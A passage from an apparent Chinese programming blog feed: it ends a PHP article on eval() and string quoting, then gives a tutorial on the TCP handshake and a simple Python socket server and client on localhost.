<p>以上故事告诉我们一个道理：<strong>单凭赋值语句是完成不了字符串单双引号转换的</strong>。</p>
<hr>
<h1 id="0x03-玩法进阶"><a href="#0x03-玩法进阶" class="headerlink" title="0x03 玩法进阶"></a>0x03 玩法进阶</h1><p>对于官方文档中示例代码的疑惑，看到分割线以上就 OK 了，想再深入理解的可继续看下面的玩法（每个玩法在上例基础上修改，之间互不干扰）：</p>
<h2 id="玩法-1：将-eval-函数的第二层解析改为单引号："><a href="#玩法-1：将-eval-函数的第二层解析改为单引号：" class="headerlink" title="玩法 1：将 eval() 函数的第二层解析改为单引号："></a><strong>玩法 1：将 eval() 函数的第二层解析改为单引号：</strong></h2><blockquote>
<p><strong>注意：第二层解析的单引号不需要转义，因为第一层是双引号。</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$result_2 = &#x27;<span class="subst">$origin</span>&#x27;;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>此时输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a $string with my $name in it.</span><br></pre></td></tr></table></figure>

<p>如果理解了上面 <code>result_2</code> 的输出原理，结果容易理解，即相当于执行了 <code>$result_2 = &#39;This is a $string with my $name in it.&#39;</code>，自然与 <code>$origin</code> 和 <code>result_1</code> 相同。</p>
<h2 id="玩法-2：将-origin-字符串两边改为双引号："><a href="#玩法-2：将-origin-字符串两边改为双引号：" class="headerlink" title="玩法 2：将 $origin 字符串两边改为双引号："></a><strong>玩法 2：将 <code>$origin</code> 字符串两边改为双引号：</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$origin</span> = <span class="string">&quot;This is a <span class="subst">$string</span> with my <span class="subst">$name</span> in it.&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>此时输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a cup with my coffee in it.</span><br><span class="line">This is a cup with my coffee in it.</span><br><span class="line">This is a cup with my coffee in it.</span><br></pre></td></tr></table></figure>

<p>这种情况也容易理解，原始字符串一开始就是双引号，那自然是一直解析到底。</p>
<h2 id="玩法-3：将-eval-函数的第二层解析改为单引号，并将-origin-字符串两边改为双引号："><a href="#玩法-3：将-eval-函数的第二层解析改为单引号，并将-origin-字符串两边改为双引号：" class="headerlink" title="玩法 3：将 eval() 函数的第二层解析改为单引号，并将 $origin 字符串两边改为双引号："></a><strong>玩法 3：将 eval() 函数的第二层解析改为单引号，并将 <code>$origin</code> 字符串两边改为双引号：</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$origin</span> = <span class="string">&quot;This is a <span class="subst">$string</span> with my <span class="subst">$name</span> in it.&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$result_2 = &#x27;<span class="subst">$origin</span>&#x27;;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>此时输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a cup with my coffee in it.</span><br><span class="line">This is a cup with my coffee in it.</span><br><span class="line">This is a cup with my coffee in it.</span><br></pre></td></tr></table></figure>

<p>输出结果与玩法 2 相同，<strong>不过注意一点，就是 eval() 函数第一层转义后，返回值为 <code>$result_2 = &#39;This is a cup with my coffee in it.&#39;</code>，即得到的是所有变量都解析后的字符串</strong>。</p>
<h2 id="玩法-4：将-eval-函数的第一层解析改为单引号："><a href="#玩法-4：将-eval-函数的第一层解析改为单引号：" class="headerlink" title="玩法 4：将 eval() 函数的第一层解析改为单引号："></a><strong>玩法 4：将 eval() 函数的第一层解析改为单引号：</strong></h2><blockquote>
<p><strong>注意：第二层解析的双引号不需要转义，因为第一层是单引号，并且单引号内本身就不会转义 <code>$</code>，所以 <code>$</code>  前面的转义字符也可以去除。</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$result_2 = &quot;$origin&quot;;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>此时输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a $string with my $name in it.</span><br></pre></td></tr></table></figure>

<p>输出结果与玩法 1 相同，但输出原理却不同了。第一层解析时，<code>$origin</code> 是原封不动保留下来的，即 <code>$result_2 = &quot;$origin&quot;</code>，跟 <code>result_1</code> 的情况完全相同。</p>
<h2 id="玩法-5：将-eval-函数的第一层和第二层解析都改为单引号："><a href="#玩法-5：将-eval-函数的第一层和第二层解析都改为单引号：" class="headerlink" title="玩法 5：将 eval() 函数的第一层和第二层解析都改为单引号："></a><strong>玩法 5：将 eval() 函数的第一层和第二层解析都改为单引号：</strong></h2><blockquote>
<p><strong>注意：第二层解析的单引号此时需要转义，因为第一层也是单引号。</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$result_2 = \&#x27;$origin\&#x27;;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>此时输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a $string with my $name in it.</span><br><span class="line">$origin</span><br></pre></td></tr></table></figure>

<p>这次的输出结果有点意思，跟玩法 4 一样，在第一层解析时，<code>$origin</code> 原封不动保留下来，即 <code>$result_2 = &#39;$origin&#39;</code>，而且在第二层解析时也要原封不动地输出字符串 <code>$origin</code>。</p>
<p>还有两种玩法（即分别在玩法 4 和玩法 5 的基础上，将 <code>$origin</code> 字符串两边改为双引号）大同小异，这里就不详述了，有兴趣的读者可以自行推导。</p>
]]></content>
      <categories>
        <category>Programming</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
        <tag>API</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 绝技 —— TCP 服务器与客户端</title>
    <url>/2018/05/23/python-trick-tcp-server-and-client/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>「网络」一直以来都是黑客最热衷的竞技场。数据在网络中肆意传播：主机扫描、代码注入、网络嗅探、数据篡改重放、拒绝服务攻击……黑客的功底越深厚，能做的就越多。</p>
<p>Python 作为一种解释型脚本语言，自 1991 年问世以来，其简洁、明确、可读性强的语法深受黑客青睐，特别在网络工具的编写上，避免了繁琐的底层语法，没有对运行速度的高效要求，使得 Python 成为安全工作者的必备杀手锏。</p>
<p>本文作为「Python 绝技」系列工具文章的开篇，先介绍因特网的<strong>核心协议 TCP</strong> ，再以 Python 的 socket 模块为例介绍网络套接字，最后给出 <strong>TCP 服务器与客户端</strong>的 Python 脚本，并演示两者之间的通信过程。</p>
<span id="more"></span>

<h1 id="0x01-TCP-协议"><a href="#0x01-TCP-协议" class="headerlink" title="0x01 TCP 协议"></a>0x01 TCP 协议</h1><p><a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol"><strong>TCP（Transmission Control Protocol，传输控制协议）</strong></a>是一种面向连接、可靠的、基于字节流的传输层通信协议。</p>
<p>TCP 协议的执行过程分为<strong>连接创建（Connection Establishment）</strong>、<strong>数据传送（Data Transfer）</strong>和<strong>连接终止（Connection Termination）</strong>三个阶段，其中「连接创建」与「连接终止」分别是耳熟能详的 <strong>TCP 协议三次握手（TCP Three-way Handshake）</strong>与<strong>四次挥手（TCP Four-way Handshake）</strong>，也是理解本文 TCP 服务器与客户端通信过程的两个核心阶段。</p>
<p>为了能更好地理解下述过程，对 TCP 协议头的关键区段做以下几点说明：</p>
<ul>
<li>报文的功能在 TCP 协议头的<strong>标记符（Flags）</strong>区段中定义，该区段位于第 104~111 比特位，共占 8 比特，每个比特位对应一种功能，置 1 代表开启，置 0 代表关闭。例如，SYN 报文的标记符为 <code>00000010</code>，ACK 报文的标记符为 <code>00010000</code>，ACK + SYN 报文的标记符为 <code>00010010</code>。</li>
<li>报文的序列号在 TCP 协议头的<strong>序列号（Sequence Number）</strong>区段中定义，该区段位于第 32~63 比特位，共占 32 比特。例如，在「三次握手」过程中，初始序列号 $seq$ 由数据发送方随机生成。</li>
<li>报文的确认号在 TCP 协议头的<strong>确认号（Acknowledgement Number）</strong>区段中定义，该区段位于第 64~95 比特位，共占 32 比特。例如，在「三次握手」过程中，确认号 $ack$ 为前序接收报文的序列号加 1，代表下一次期望接收到的报文序列号。</li>
</ul>
<h2 id="连接创建（Connection-Establishment）"><a href="#连接创建（Connection-Establishment）" class="headerlink" title="连接创建（Connection Establishment）"></a>连接创建（Connection Establishment）</h2><p>所谓的「三次握手」，即 TCP 服务器与客户端成功建立通信连接必经的三个步骤，共需通过三个报文完成。</p>
<p>一般而言，首先发送 SYN 报文的一方是客户端，服务器则是监听来自客户端的建立连接请求。</p>
<h3 id="Handshake-Step-1"><a href="#Handshake-Step-1" class="headerlink" title="Handshake Step 1"></a>Handshake Step 1</h3><p>客户端向服务器发送 SYN 报文（$SYN &#x3D; 1$）请求建立连接。</p>
<p>此时报文的初始序列号为 $seq &#x3D; x$，确认号为 $ack &#x3D; 0$。发送完毕后，客户端进入 <strong><code>SYN_SENT</code></strong> 状态。</p>
<h3 id="Handshake-Step-2"><a href="#Handshake-Step-2" class="headerlink" title="Handshake Step 2"></a>Handshake Step 2</h3><p>服务器接收到客户端的 SYN 报文后，发送 ACK + SYN 报文（$ACK &#x3D; 1，SYN &#x3D; 1$）确认客户端的建立连接请求，并也向其发起建立连接请求。</p>
<p>此时报文的序列号为 $seq &#x3D; y$，确认号为 $ack &#x3D; x + 1$。发送完毕后，服务器进入 <strong><code>SYN_RCVD</code></strong> 状态。</p>
<h3 id="Handshake-Step-3"><a href="#Handshake-Step-3" class="headerlink" title="Handshake Step 3"></a>Handshake Step 3</h3><p>客户端接收到服务器的 SYN 报文后，发送 ACK 报文（$ACK &#x3D; 1$）确认服务器的建立连接请求。</p>
<p>此时报文的序列号为 $seq &#x3D; x + 1$，确认号为 $ack &#x3D; y + 1$。发送完毕后，客户端进入 <strong><code>ESTABLISHED</code></strong> 状态；当服务器接收该报文后，也进入了 <strong><code>ESTABLISHED</code></strong> 状态。</p>
<p>至此，「三次握手」过程全部结束，TCP 通信连接成功建立。</p>
<p>读者可参照以下「三次握手」的示意图进行理解：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/python-trick-tcp-server-and-client/tcp-three-way-handshake.png" alt="tcp-three-way-handshake"></p>
<h2 id="连接终止（Connection-Termination）"><a href="#连接终止（Connection-Termination）" class="headerlink" title="连接终止（Connection Termination）"></a>连接终止（Connection Termination）</h2><p>所谓的「四次挥手」，即 TCP 服务器与客户端完全终止通信连接必经的四个步骤，共需通过四个报文完成。</p>
<p>由于 TCP 通信连接是全双工的，因此每个方向的连接可以单独关闭，即可视为一对「二次挥手」，或一对单工连接。主动先发送 FIN 报文的一方，意味着想要关闭到另一方的通信连接，即在此方向上不再传输数据，但仍可以接收来自另一方传输过来的数据，直到另一方也发送 FIN 报文，双方的通信连接才完全终止。</p>
<p><strong>注意，首先发送 FIN 报文的一方，既可以是客户端，也可以是服务器。</strong>下面以客户端先发起关闭请求为例，对「四次挥手」的过程进行讲解。</p>
<h3 id="Handshake-Step-1-1"><a href="#Handshake-Step-1-1" class="headerlink" title="Handshake Step 1"></a>Handshake Step 1</h3><p>当客户端不再向服务器传输数据时，则向其发送 FIN 报文（$FIN &#x3D; 1$）请求关闭连接。</p>
<p>此时报文的初始序列号为 $seq &#x3D; u$，确认号为 $ack &#x3D; 0$（若此报文中 $ACK &#x3D; 1$，则 $ack$ 的值与客户端的前序接收报文有关）。发送完毕后，客户端进入 <strong><code>FIN_WAIT_1</code></strong> 状态。</p>
<h3 id="Handshake-Step-2-1"><a href="#Handshake-Step-2-1" class="headerlink" title="Handshake Step 2"></a>Handshake Step 2</h3><p>服务器接收到客户端的 FIN 报文后，发送 ACK 报文（$ACK &#x3D; 1$）确认客户端的关闭连接请求。</p>
<p>此时报文的序列号为 $seq &#x3D; v$，确认号为 $ack &#x3D; u + 1$。发送完毕后，服务器进入 <strong><code>CLOSE_WAIT</code></strong> 状态；当客户端接收该报文后，进入 <strong><code>FIN_WAIT_2</code></strong> 状态。</p>
<p>注意，此时 TCP 通信连接处于<strong>半关闭</strong>状态，即客户端不再向服务器传输数据，但仍可以接收服务器传输过来的数据。</p>
<h3 id="Handshake-Step-3-1"><a href="#Handshake-Step-3-1" class="headerlink" title="Handshake Step 3"></a>Handshake Step 3</h3><p>当服务器不再向客户端传输数据时，则向其发送 FIN + ACK 报文（$FIN &#x3D; 1，ACK &#x3D; 1$）请求关闭连接。</p>
<p>此时报文的序列号为 $seq &#x3D; w$（若在半关闭状态，服务器没有向客户端传输过数据，则 $seq &#x3D; v + 1$ ），确认号为 $ack &#x3D; u + 1$。发送完毕后，服务器进入 <strong><code>LAST_ACK</code></strong> 状态。</p>
<h3 id="Handshake-Step-4"><a href="#Handshake-Step-4" class="headerlink" title="Handshake Step 4"></a>Handshake Step 4</h3><p>客户端接收到服务器的 FIN + ACK 报文后，发送 ACK 报文（$ACK &#x3D; 1$）确认服务器的关闭连接请求。</p>
<p>此时报文的序列号为 $seq &#x3D; u + 1$，确认号为 $ack &#x3D; w + 1$。发送完毕后，客户端进入 <strong><code>TIME_WAIT</code></strong> 状态；当服务器接收该报文后，进入 <strong><code>CLOSED</code></strong> 状态；当客户端等待了 <strong>2<a href="https://en.wikipedia.org/wiki/Maximum_segment_lifetime">MSL</a></strong> 后，仍没接到服务器的响应，则认为服务器已正常关闭，自己也进入 <strong><code>CLOSED</code></strong> 状态。</p>
<p>至此，「四次挥手」过程全部结束，TCP 通信连接成功关闭。</p>
<p>读者可参照以下「四次挥手」的示意图进行理解：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/python-trick-tcp-server-and-client/tcp-four-way-handshake.png" alt="tcp-four-way-handshake"></p>
<h1 id="0x02-Network-Socket"><a href="#0x02-Network-Socket" class="headerlink" title="0x02 Network Socket"></a>0x02 Network Socket</h1><p><a href="https://en.wikipedia.org/wiki/Network_socket"><strong>Network Socket（网络套接字）</strong></a>是计算机网络中进程间通信的数据流端点，广义上也代表操作系统提供的一种进程间通信机制。</p>
<p><a href="https://en.wikipedia.org/wiki/Inter-process_communication"><strong>进程间通信（Inter-Process Communication，IPC）</strong></a>的根本前提是<strong>能够唯一标示每个进程</strong>。在本地主机的进程间通信中，可以用 <strong><a href="https://en.wikipedia.org/wiki/Process_identifier">PID（进程 ID）</a><strong>唯一标示每个进程，但 PID 只在本地唯一，在网络中不同主机的 PID 则可能发生冲突，因此采用</strong>「IP 地址 + 传输层协议 + 端口号」</strong>的方式唯一标示网络中的一个进程。</p>
<blockquote>
<p>小贴士：网络层的 IP 地址可以唯一标示主机，传输层的 TCP&#x2F;UDP 协议和端口号可以唯一标示该主机的一个进程。注意，同一主机中 TCP 协议与 UDP 协议的可以使用相同的端口号。</p>
</blockquote>
<p>所有支持网络通信的编程语言都各自提供了一套 socket API，下面以 Python 3 为例，讲解服务器与客户端建立 TCP 通信连接的交互过程：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/python-trick-tcp-server-and-client/tcp-socket-python.png" alt="tcp-socket-python"></p>
<p>脑海中先对上述过程产生一定印象后，更易于理解下面两节 TCP 服务器与客户端的 Python 实现。</p>
<h1 id="0x03-TCP-服务器"><a href="#0x03-TCP-服务器" class="headerlink" title="0x03 TCP 服务器"></a>0x03 TCP 服务器</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcplink</span>(<span class="params">conn, addr</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Accept new connection from %s:%s&quot;</span> % addr)</span><br><span class="line">	conn.send(<span class="string">b&quot;Welcome!\n&quot;</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		conn.send(<span class="string">b&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">		data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">		<span class="keyword">if</span> data == <span class="string">b&quot;exit&quot;</span>:</span><br><span class="line">			conn.send(<span class="string">b&quot;Good bye!\n&quot;</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		conn.send(<span class="string">b&quot;Hello %s!\n&quot;</span> % data)</span><br><span class="line">	conn.close()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Connection from %s:%s is closed&quot;</span> % addr)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6000</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Waiting for connection...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	conn, addr = s.accept()</span><br><span class="line">	t = threading.Thread(target = tcplink, args = (conn, addr))</span><br><span class="line">	t.start()</span><br></pre></td></tr></table></figure>

<ul>
<li>Line 6：定义一个 tcplink() 函数，第一个 <em>conn</em> 参数为服务器与客户端交互数据的套接字对象，第二个 <em>addr</em> 参数为客户端的 IP 地址与端口号，用二元组 (host, port) 表示。</li>
<li>Line 8：连接成功后，向客户端发送欢迎信息 <code>b&quot;Welcome!\n&quot;</code>。</li>
<li>Line 9：进入与客户端交互数据的循环阶段。</li>
<li>Line 10：向客户端发送询问信息 <code>b&quot;What&#39;s your name?&quot;</code>。</li>
<li>Line 11：接收客户端发来的 bytes 对象。</li>
<li>Line 12：若 bytes 对象为 <code>b&quot;exit&quot;</code>，则向客户端发送结束响应信息 <code>b&quot;Good bye!\n&quot;</code>，并结束与客户端交互数据的循环阶段。</li>
<li>Line 15：若 bytes 对象不为 <code>b&quot;exit&quot;</code>，则向客户端发送问候响应信息 <code>b&quot;Hello %s!\n&quot;</code>，其中 <code>%s</code> 是客户端发来的 bytes 对象。</li>
<li>Line 16：关闭套接字，不再向客户端发送数据。</li>
<li>Line 19：创建 socket 对象，第一个参数为 <em>socket.AF_INET</em>，代表采用 IPv4 协议用于网络通信，第二个参数为 <em>socket.SOCK_STREAM</em>，代表采用 TCP 协议用于面向连接的网络通信。</li>
<li>Line 20：向 socket 对象绑定服务器主机地址 (“127.0.0.1”, 6000)，即本地主机的 TCP 6000 端口。</li>
<li>Line 21：开启 socket 对象的监听功能，等待客户端的连接请求。</li>
<li>Line 24：进入监听客户端连接请求的循环阶段。</li>
<li>Line 25：接收客户端的连接请求，并获得与客户端交互数据的套接字对象 conn 与客户端的 IP 地址与端口号 addr，其中 addr 为二元组 (host, port)。</li>
<li>Line 26：利用多线程技术，为每个请求连接的 TCP 客户端创建一个新线程，实现了一台服务器同时与多台客户端进行通信的功能。</li>
<li>Line 27：开启新线程的活动。</li>
</ul>
<h1 id="0x04-TCP-客户端"><a href="#0x04-TCP-客户端" class="headerlink" title="0x04 TCP 客户端"></a>0x04 TCP 客户端</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6000</span>))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;client&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">if</span> data:</span><br><span class="line">		<span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())</span><br><span class="line">	data = <span class="built_in">input</span>(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	s.send(data.encode())</span><br><span class="line">	<span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())</span><br><span class="line">	<span class="keyword">if</span> data == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>Line 5：创建 socket 对象，第一个参数为 <em>socket.AF_INET</em>，代表采用 IPv4 协议用于网络通信，第二个参数为 <em>socket.SOCK_STREAM</em>，代表采用 TCP 协议用于面向连接的网络通信。</li>
<li>Line 6：向 (“127.0.0.1”, 6000) 主机发起连接请求，即本地主机的 TCP 6000 端口。</li>
<li>Line 7：连接成功后，接收服务器发来的欢迎信息 <code>b&quot;Welcome!\n&quot;</code>，并转换为字符串后打印输出。</li>
<li>Line 9：创建一个非空字符串变量 data，并赋初值为 <code>&quot;client&quot;</code>（只要是非空字符串即可），用于判断是否接收来自服务器发来的询问信息 <code>b&quot;What&#39;s your name?&quot;</code>。</li>
<li>Line 10：进入与服务器交互数据的循环阶段。</li>
<li>Line 11：当变量 data 非空时，则接收服务器发来的询问信息。</li>
<li>Line 13：要求用户输入名字。</li>
<li>Line 14：当用户的输入为空时，则重新开始循环，要求用户重新输入。</li>
<li>Line 16：当用户的输入非空时，则将字符串转换为 bytes 对象后发送至服务器。</li>
<li>Line 17：接收服务器的响应数据，并将响应的 bytes 对象转换为字符串后打印输出。</li>
<li>Line 18：当用户的输入为 <code>&quot;exit&quot;</code> 时，则终止与服务器交互数据的循环阶段，即将关闭套接字。</li>
<li>Line 21：关闭套接字，不再向服务器发送数据。</li>
</ul>
<h1 id="0x05-TCP-进程间通信"><a href="#0x05-TCP-进程间通信" class="headerlink" title="0x05 TCP 进程间通信"></a>0x05 TCP 进程间通信</h1><p>将 TCP 服务器与客户端的脚本分别命名为 <code>tcp_server.py</code> 与 <code>tcp_client.py</code>，然后存至桌面，笔者将在 Windows 10 系统下用 PowerShell 进行演示。</p>
<blockquote>
<p>小贴士：读者进行复现时，要确保本机已安装 Python 3，注意笔者已将默认的启动路径名 <code>python</code> 改为了 <code>python3</code>。</p>
</blockquote>
<h2 id="单服务器-VS-单客户端"><a href="#单服务器-VS-单客户端" class="headerlink" title="单服务器 VS 单客户端"></a>单服务器 VS 单客户端</h2><p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/python-trick-tcp-server-and-client/one-server-vs-one-client.png" alt="one-server-vs-one-client"></p>
<ol>
<li>在其中一个 PowerShell 中运行命令 <code>python3 ./tcp_server.py</code>，服务器显示 <code>Waiting for connection...</code>，并监听本地主机的 TCP 6000 端口，进入等待连接状态；</li>
<li>在另一个 PowerShell 中运行命令 <code>python3 ./tcp_client.py</code>，服务器显示 <code>Accept new connection from 127.0.0.1:42101</code>，完成与本地主机的 TCP 42101 端口建立通信连接，并向客户端发送欢迎信息与询问信息，客户端接收到信息后打印输出；</li>
<li>若客户端向服务器发送字符串 <code>Alice</code> 与 <code>Bob</code>，则收到服务器的问候响应信息；</li>
<li>若客户端向服务器发送空字符串，则被要求重新输入；</li>
<li>若客户端向服务器发送字符串 <code>exit</code>，则收到服务器的结束响应信息；</li>
<li>客户端与服务器之间的通信连接已关闭，服务器显示 <code>Connection from 127.0.0.1:42101 is closed</code>，并继续监听客户端的连接请求。</li>
</ol>
<h2 id="单服务器-VS-多客户端"><a href="#单服务器-VS-多客户端" class="headerlink" title="单服务器 VS 多客户端"></a>单服务器 VS 多客户端</h2><p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/python-trick-tcp-server-and-client/one-server-vs-multiple-clients.png" alt="one-server-vs-multiple-clients"></p>
<ol>
<li>在其中一个 PowerShell 中运行命令 <code>python3 ./tcp_server.py</code>，服务器显示 <code>Waiting for connection...</code>，并监听本地主机的 TCP 6000 端口，进入等待连接状态；</li>
<li>在另三个 PowerShell 中分别运行命令 <code>python3 ./tcp_client.py</code>，服务器同时与本地主机的 TCP 42719、42721、42722 端口建立通信连接，并分别向客户端发送欢迎信息与询问信息，客户端接收到信息后打印输出；</li>
<li>三台客户端分别向服务器发送字符串 <code>Client1</code>、<code>Client2</code>、<code>Client3</code>，并收到服务器的问候响应信息；</li>
<li>所有客户端分别向服务器发送字符串 <code>exit</code>，并收到服务器的结束响应信息；</li>
<li>所有客户端与服务器之间的通信连接已关闭，服务器继续监听客户端的连接请求。</li>
</ol>
<h1 id="0x06-Python-API-Reference"><a href="#0x06-Python-API-Reference" class="headerlink" title="0x06 Python API Reference"></a>0x06 Python API Reference</h1><h2 id="socket-模块"><a href="#socket-模块" class="headerlink" title="socket 模块"></a>socket 模块</h2><p>本节介绍上述代码中用到的<a href="https://docs.python.org/3/library/socket.html">内建模块 socket</a>，是 Python 网络编程的核心模块。</p>
<h3 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket() 函数"></a>socket() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket">socket() 函数</a>用于创建网络通信中的套接字对象。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.socket(family=AF_INET, <span class="built_in">type</span>=SOCK_STREAM, proto=<span class="number">0</span>, fileno=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><em>family</em> 参数代表<a href="https://docs.python.org/3/library/socket.html#socket-families">地址族（Address Family）</a>，默认值为 <em>AF_INET</em>，用于 IPv4 网络通信，常用的还有 <em>AF_INET6</em>，用于 IPv6 网络通信。<em>family</em> 参数的可选值取决于本机操作系统。</li>
<li><em>type</em> 参数代表套接字的类型，默认值为 <em>SOCK_STREAM</em>，用于 TCP 协议（面向连接）的网络通信，常用的还有 <em>SOCK_DGRAM</em>，用于 UDP 协议（无连接）的网络通信。</li>
<li><em>proto</em> 参数代表套接字的协议，默认值为 <em>0</em>，一般忽略该参数，除非 <em>family</em> 参数为 <em>AF_CAN</em>，则 <em>proto</em> 参数需设置为 <em>CAN_RAW</em> 或 <em>CAN_BCM</em>。</li>
<li><em>fileno</em> 参数代表套接字的文件描述符，默认值为 <em>None</em>，若设置了该参数，则其他三个参数将会被忽略。</li>
</ul>
<p>创建完套接字对象后，需使用对象的内置函数完成网络通信过程。<strong>注意，以下函数原型中的「socket」是指 socket 对象，而不是上述的 socket 模块。</strong></p>
<h3 id="bind-函数"><a href="#bind-函数" class="headerlink" title="bind() 函数"></a>bind() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.bind">bind() 函数</a>用于向套接字对象绑定 IP 地址与端口号。注意，套接字对象必须未被绑定，并且端口号未被占用，否则会报错。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.bind(address)</span><br></pre></td></tr></table></figure>

<ul>
<li><em>address</em> 参数代表套接字要绑定的地址，其格式取决于套接字的 <em>family</em> 参数。若 <em>family</em> 参数为 <em>AF_INET</em>，则 <em>address</em> 参数表示为二元组 (host, port)，其中 host 是用字符串表示的主机地址，port 是用整型表示的端口号。</li>
</ul>
<h3 id="listen-函数"><a href="#listen-函数" class="headerlink" title="listen() 函数"></a>listen() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.listen">listen() 函数</a>用于 TCP 服务器开启套接字的监听功能。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.listen([backlog])</span><br></pre></td></tr></table></figure>

<ul>
<li><em>backlog</em> 可选参数代表套接字在拒绝新连接之前，操作系统可以挂起的最大连接数。<em>backlog</em> 参数一般设置为 <em>5</em>，若未设置，系统会为其自动设置一个合理的值。</li>
</ul>
<h3 id="connect-函数"><a href="#connect-函数" class="headerlink" title="connect() 函数"></a>connect() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.connect">connect() 函数</a>用于 TCP 客户端向 TCP 服务器发起连接请求。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.connect(address)</span><br></pre></td></tr></table></figure>

<ul>
<li><em>address</em> 参数代表套接字要连接的地址，其格式取决于套接字的 <em>family</em> 参数。若 <em>family</em> 参数为 <em>AF_INET</em>，则 <em>address</em> 参数表示为二元组 (host, port)，其中 host 是用字符串表示的主机地址，port 是用整型表示的端口号。</li>
</ul>
<h3 id="accept-函数"><a href="#accept-函数" class="headerlink" title="accept() 函数"></a>accept() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.accept">accept() 函数</a>用于 TCP 服务器接受 TCP 客户端的连接请求。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.accept()</span><br></pre></td></tr></table></figure>

<p>accept() 函数的返回值是二元组 (conn, address)，其中 conn 是服务器用来与客户端交互数据的套接字对象，address 是客户端的 IP 地址与端口号，用二元组 (host, port) 表示。</p>
